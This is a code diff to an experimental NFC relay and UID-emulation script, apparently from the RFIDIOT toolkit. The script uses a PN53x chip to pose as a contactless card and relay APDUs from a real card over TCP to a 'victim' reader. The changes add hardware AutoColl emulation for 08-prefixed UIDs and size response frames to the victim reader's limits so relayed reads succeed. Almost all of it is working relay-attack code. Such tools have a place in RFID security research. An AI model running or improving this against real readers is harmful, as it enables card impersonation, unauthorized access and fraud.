@@ -68,6 +68,9 @@ def usage():
     print("                  remote relayuid (its -c tcp:HOST:PORT). No -f needed.")
     print("    -w <SECONDS>  stop after this many seconds (default: run until Ctrl-C)")
     print()
+    print("  A 4-byte UID starting with 08 is presented natively by the chip's AutoColl")
+    print("  (no priming, survives readers that cycle their field); other UIDs are primed.")
+    print()
     print("  Emulator mode needs a libnfc PN53x (-f), e.g. an SCL3711. Split across two")
     print("  machines: run  relayuid.py -S 5000 -c eccid:3:66  on the card's host, and")
     print("  relayuid.py -f pn53x_usb:... -c tcp:<cardhost>:5000 auto  on the emulator's.")
@@ -119,9 +122,18 @@ def random_uid():
 # never trips the reader's frame-wait timeout; avoids needing S(WTX)), TC1=00 (no
 # CID, no NAD). No historical bytes.
 ATS = bytes.fromhex("057880E000")
-# largest INF we put in one response I-block before chaining (< FSD 256 and the
-# PN53x target frame limit); mrpkey's reads are ~118 B so this rarely triggers
+# largest INF we put in one response I-block before chaining - a ceiling (< FSD
+# 256 and the PN53x target frame limit). The ACTUAL per-frame limit is the
+# victim's FSD, announced in its RATS (FSDI): we clamp to it at RATS time, below.
+# Getting this wrong overflows a victim with a small FSD - e.g. a libnfc PN532
+# victim RATSes FSDI 5 (FSD 64), so a 74-byte SELECT-AID FCI sent in one frame
+# is dropped and the read stalls; an ACR122U victim RATSes FSD 256 and never hit it.
 FRAG = 240
+# ISO 14443-4 FSD (bytes a reader can receive in one frame) by FSDI 0..12
+FSD_TABLE = {0: 16, 1: 24, 2: 32, 3: 40, 4: 48, 5: 64, 6: 96, 7: 128,
+             8: 256, 9: 512, 10: 1024, 11: 2048, 12: 4096}
+# response fragment size actually used; clamped to the victim's FSD when it RATSes
+victim_frag = FRAG
 
 # --- APDU responder: stub, or relay to a real card --------------------------
 relay_reader = None
@@ -228,13 +240,13 @@ if serve_port is not None:
     if not relay:
         print("  agent mode (-S) needs -c <local-reader> (the real card's reader)")
         sys.exit(True)
-    print("relayuid v0.1a (EXPERIMENTAL) - agent mode")
+    print("relayuid v0.1c (EXPERIMENTAL) - agent mode")
     serve(serve_port, relay)
     sys.exit(False)
 
 # --- emulator mode from here (open the libnfc PN53x only now) ---
 card = rfidiot.card
-card.info("relayuid v0.1a (EXPERIMENTAL)")
+card.info("relayuid v0.1c (EXPERIMENTAL)")
 if card.readertype != card.READER_LIBNFC or not hasattr(card.nfc, "initAsTarget"):
     print("  The emulator must be a libnfc PN53x reader (-f <connstring>)")
     sys.exit(True)
@@ -296,27 +308,6 @@ for n, part in enumerate(parts):
     level_sak = (sak & ~0x04) if final else 0x04
     levels.append((0x93 + 2 * n, part + bytes([bcc]), bytes([level_sak]) + crc_a(bytes([level_sak]))))
 
-# --- prime (as emulateuid.py): SAK 20 provokes a RATS that breaks AutoColl ---
-prime_uid = "08" + os.urandom(3).hex().upper()
-nt = card.nfc.make_iso14443a_target("0400", prime_uid, "20")
-
-print()
-print("  UID %s (%s), ATQA %s, SAK %02X" % (uid.hex().upper(), uidsrc, atqa.hex().upper(), sak))
-print("  Waiting for the real reader to prime us (its first activation will fail)...")
-ok, first = card.nfc.initAsTarget(nt, int(wait * 1000) if wait else 0)
-if not ok:
-    print("  Not activated (%s)" % first)
-    sys.exit(True)
-print("  %.3f primed (by %s); now present the UID to a reader (Ctrl-C to stop)" % (time.time(), prime_uid))
-print()
-
-# host now owns every layer: anticollision frames carry no CRC, and we append
-# CRC_A to the ATS / I-blocks by hand
-card.nfc.targetHandleCRC(False)
-start = time.time()
-halted = False
-level = 0
-activated = False
 shown = {}
 
 
@@ -325,83 +316,157 @@ def send(tx_bytes, crc=False):
     card.nfc.targetSend(data.hex())
 
 
-try:
-    while not wait or time.time() - start < wait:
-        ok, frame = card.nfc.targetReceive(1000, quiet=True)
-        if not ok or not frame:
-            continue
-        rx = bytes.fromhex(frame)
-        # --- ISO 14443-3 anticollision (as emulateuid) ---
-        if rx == b"\x52" or (rx == b"\x26" and not halted):       # WUPA / REQA
-            halted = False
-            level = 0
-            activated = False
-            send(atqa)
-            continue
-        if len(rx) == 4 and rx[:2] == b"\x50\x00":                 # HLTA
-            halted = True
-            continue
-        if len(rx) == 2 and level < len(levels) and rx == bytes([levels[level][0], 0x20]):
-            send(levels[level][1])                                 # ANTICOL: UID CLn + BCC
-            continue
-        if len(rx) == 9 and level < len(levels) and rx[0] == levels[level][0] and rx[1] == 0x70 \
-                and rx[2:7] == levels[level][1]:
-            send(levels[level][2])                                 # SELECT: SAK + CRC (already appended)
-            level += 1
-            if level == len(levels):
-                activated = True
-                print("  %.3f selected as %s" % (time.time(), uid.hex().upper()))
-            continue
-        # --- ISO 14443-4 (T=CL), we are the card ---
-        if activated and rx and rx[0] == 0xE0:                     # RATS
-            print("  %.3f RATS %s -> ATS %s" % (time.time(), frame, ATS.hex().upper()))
-            send(ATS, crc=True)
-            continue
-        if activated and rx and (rx[0] & 0xC0) == 0x00:            # I-block (command APDU)
-            pcb = rx[0]
-            inf = rx[1:-2]                                         # strip PCB + CRC (no CID)
-            # receive-side (command) chaining: the reader splits a long command into
-            # chained I-blocks (PCB bit 0x10); R(ACK) each and accumulate the INF
-            while pcb & 0x10:
-                send(bytes([0xA2 | ((pcb & 0x01) ^ 1)]), crc=True)  # R(ACK), toggled block
-                ok, f2 = card.nfc.targetReceive(2000, quiet=True)
-                if not ok or not f2:
-                    break
-                n = bytes.fromhex(f2)
-                pcb = n[0]
-                inf += n[1:-2]
-            apdu = inf.hex().upper()
-            resp = responder(apdu)
-            print("  %.3f << %s   >> %s" % (time.time(), apdu, (resp[:40] + "..") if resp and len(resp) > 40 else resp))
-            if resp is None:
-                continue
-            rbytes = bytes.fromhex(resp)
-            # send-side (response) chaining: split INF > FRAG into chained I-blocks,
-            # each ACKed by the reader with an R(ACK); block number toggles per block
-            block = pcb & 0x01                                     # response echoes the command block number
-            off = 0
-            while True:
-                frag = rbytes[off:off + FRAG]
-                off += FRAG
-                last = off >= len(rbytes)
-                send(bytes([0x02 | block | (0x00 if last else 0x10)]) + frag, crc=True)
-                if last:
-                    break
-                ok, _ack = card.nfc.targetReceive(2000, quiet=True)  # R(ACK) from reader
+def handle_tcl(rx, frame):
+    """service one ISO 14443-4 (T=CL) frame from the reader - we are the card.
+    Shared by both activation paths (host anticollision and native AutoColl):
+    answer the RATS with the ATS, relay I-block APDUs (with command/response
+    chaining), echo S(WTX). CRC_A is appended by hand (targetHandleCRC off)."""
+    global victim_frag
+    if rx and rx[0] == 0xE0:                                    # RATS
+        # clamp response fragmentation to the victim's FSD (FSDI = high nibble of
+        # the RATS param byte) so we never send a frame it can't receive
+        fsdi = (rx[1] >> 4) if len(rx) > 1 else 8
+        fsd = FSD_TABLE.get(fsdi, 256)
+        victim_frag = min(FRAG, fsd - 3)                       # - PCB - CRC(2); no CID/NAD
+        print("  %.3f RATS %s (FSDI %d = FSD %d, frag %d) -> ATS %s"
+              % (time.time(), frame, fsdi, fsd, victim_frag, ATS.hex().upper()))
+        send(ATS, crc=True)
+        return
+    if rx and (rx[0] & 0xC0) == 0x00:                           # I-block (command APDU)
+        pcb = rx[0]
+        inf = rx[1:-2]                                          # strip PCB + CRC (no CID)
+        # receive-side (command) chaining: the reader splits a long command into
+        # chained I-blocks (PCB bit 0x10); R(ACK) each and accumulate the INF
+        while pcb & 0x10:
+            send(bytes([0xA2 | ((pcb & 0x01) ^ 1)]), crc=True)  # R(ACK), toggled block
+            ok, f2 = card.nfc.targetReceive(2000, quiet=True)
+            if not ok or not f2:
+                break
+            n = bytes.fromhex(f2)
+            pcb = n[0]
+            inf += n[1:-2]
+        apdu = inf.hex().upper()
+        resp = responder(apdu)
+        print("  %.3f << %s   >> %s (%dB)"
+              % (time.time(), apdu, (resp[:40] + "..") if resp and len(resp) > 40 else resp,
+                 len(resp) // 2 if resp else 0))
+        if resp is None:
+            return
+        rbytes = bytes.fromhex(resp)
+        # send-side (response) chaining: split INF > victim_frag into chained
+        # I-blocks (clamped to the victim's FSD at RATS), each ACKed by the reader
+        # with an R(ACK); block number toggles per block
+        block = pcb & 0x01                                     # response echoes the command block number
+        off = 0
+        while True:
+            frag = rbytes[off:off + victim_frag]
+            off += victim_frag
+            last = off >= len(rbytes)
+            send(bytes([0x02 | block | (0x00 if last else 0x10)]) + frag, crc=True)
+            if last:
+                break
+            ok, _ack = card.nfc.targetReceive(2000, quiet=True)  # R(ACK) from reader
+            if not ok:
+                break
+            block ^= 1
+        return
+    if rx and (rx[0] & 0xE6) == 0xF2:                          # S(WTX) request (fallback)
+        send(bytes([0xF2]) + rx[1:2], crc=True)                # echo WTX back
+        return
+    # unhandled
+    key = frame[:6]
+    shown[key] = shown.get(key, 0) + 1
+    if rx != b"\x26" and shown[key] <= 3:
+        print("  %.3f rx %s (unhandled)" % (time.time(), frame))
+
+
+native = len(uid) == 4 and uid[0] == 0x08
+print()
+print("  UID %s (%s), ATQA %s, SAK %02X" % (uid.hex().upper(), uidsrc, atqa.hex().upper(), sak))
+start = time.time()
+
+if native:
+    # --- native: the chip's AutoColl answers anticollision with our real 08 UID
+    # itself, then (SAK 20) relays the RATS up to us; no priming, and it survives
+    # a reader that cycles its field (the UID is re-sent from hardware each poll).
+    # We arm, run T=CL until the reader drops us (NFC_ETGRELEASED), then re-arm.
+    from rfidiot.pynfc import NFC_ETGRELEASED
+    nt = card.nfc.make_iso14443a_target(atqa.hex(), uid.hex(), "%02X" % sak)
+    print("  Native hardware AutoColl (08-prefix UID): no priming, survives field-cycling.")
+    print("  Present the UID to a reader (Ctrl-C to stop" + (", or -w to bound the run)" if not wait else ")"))
+    print()
+    try:
+        while not wait or time.time() - start < wait:
+            armms = int((wait - (time.time() - start)) * 1000) if wait else 0
+            if wait and armms <= 0:
+                break
+            ok, first = card.nfc.initAsTarget(nt, armms, raw=True, quiet=True)
+            if not ok:
+                continue                                       # timeout / released -> re-arm
+            card.nfc.targetHandleCRC(False)                    # host appends CRC on T=CL
+            print("  %.3f selected as %s" % (time.time(), uid.hex().upper()))
+            if first:
+                handle_tcl(bytes.fromhex(first), first)        # the RATS handed up on activation
+            while not wait or time.time() - start < wait:      # service until released
+                ok, frame = card.nfc.targetReceive(1000, quiet=True)
                 if not ok:
-                    break
-                block ^= 1
-            continue
-        if activated and rx and (rx[0] & 0xE6) == 0xF2:            # S(WTX) request (fallback)
-            send(bytes([0xF2]) + rx[1:2], crc=True)                # echo WTX back
-            continue
-        # unhandled
-        key = frame[:6]
-        shown[key] = shown.get(key, 0) + 1
-        if rx != b"\x26" and shown[key] <= 3:
-            print("  %.3f rx %s (unhandled)" % (time.time(), frame))
-except KeyboardInterrupt:
-    pass
+                    if frame == NFC_ETGRELEASED:
+                        break                                  # field cycled / gone -> re-arm
+                    continue                                   # timeout -> keep servicing
+                if frame:
+                    handle_tcl(bytes.fromhex(frame), frame)
+    except KeyboardInterrupt:
+        pass
+else:
+    # --- priming (as emulateuid.py): SAK 20 provokes a RATS that breaks AutoColl,
+    # then the host answers anticollision itself with any UID (4/7/10 bytes) ---
+    prime_uid = "08" + os.urandom(3).hex().upper()
+    nt = card.nfc.make_iso14443a_target("0400", prime_uid, "20")
+    print("  Waiting for the real reader to prime us (its first activation will fail)...")
+    ok, first = card.nfc.initAsTarget(nt, int(wait * 1000) if wait else 0)
+    if not ok:
+        print("  Not activated (%s)" % first)
+        sys.exit(True)
+    print("  %.3f primed (by %s); now present the UID to a reader (Ctrl-C to stop)" % (time.time(), prime_uid))
+    print()
+    # host now owns every layer: anticollision frames carry no CRC, and we append
+    # CRC_A to the ATS / I-blocks by hand
+    card.nfc.targetHandleCRC(False)
+    halted = False
+    level = 0
+    activated = False
+    try:
+        while not wait or time.time() - start < wait:
+            ok, frame = card.nfc.targetReceive(1000, quiet=True)
+            if not ok or not frame:
+                continue
+            rx = bytes.fromhex(frame)
+            # --- ISO 14443-3 anticollision (as emulateuid) ---
+            if rx == b"\x52" or (rx == b"\x26" and not halted):       # WUPA / REQA
+                halted = False
+                level = 0
+                activated = False
+                send(atqa)
+                continue
+            if len(rx) == 4 and rx[:2] == b"\x50\x00":                 # HLTA
+                halted = True
+                continue
+            if len(rx) == 2 and level < len(levels) and rx == bytes([levels[level][0], 0x20]):
+                send(levels[level][1])                                 # ANTICOL: UID CLn + BCC
+                continue
+            if len(rx) == 9 and level < len(levels) and rx[0] == levels[level][0] and rx[1] == 0x70 \
+                    and rx[2:7] == levels[level][1]:
+                send(levels[level][2])                                 # SELECT: SAK + CRC (already appended)
+                level += 1
+                if level == len(levels):
+                    activated = True
+                    print("  %.3f selected as %s" % (time.time(), uid.hex().upper()))
+                continue
+            # --- ISO 14443-4 (T=CL), we are the card ---
+            if activated:
+                handle_tcl(rx, frame)
+    except KeyboardInterrupt:
+        pass
 print()
 if relay_reader is not None:
     for meth in ("disconnect", "powerOff", "deconfigure"):
